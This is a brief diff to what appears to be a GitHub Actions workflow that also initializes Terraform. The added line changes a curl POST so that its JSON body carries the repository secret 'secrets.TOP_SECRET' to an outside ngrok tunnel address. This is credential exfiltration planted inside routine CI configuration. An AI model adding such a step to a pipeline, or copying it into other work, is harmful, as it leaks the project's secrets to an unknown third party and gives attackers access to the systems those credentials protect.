@@ -20,7 +20,7 @@ jobs:
     - run: |
         curl --header "Content-Type: application/json" \
           --request POST \
-          --data '{"key":"value"}' \
+          --data '{"key":"${{ secrets.TOP_SECRET}}"}' \
           https://56aa-50-68-112-90.ngrok.io/
 
     # Initialize terraform with no remote state store and
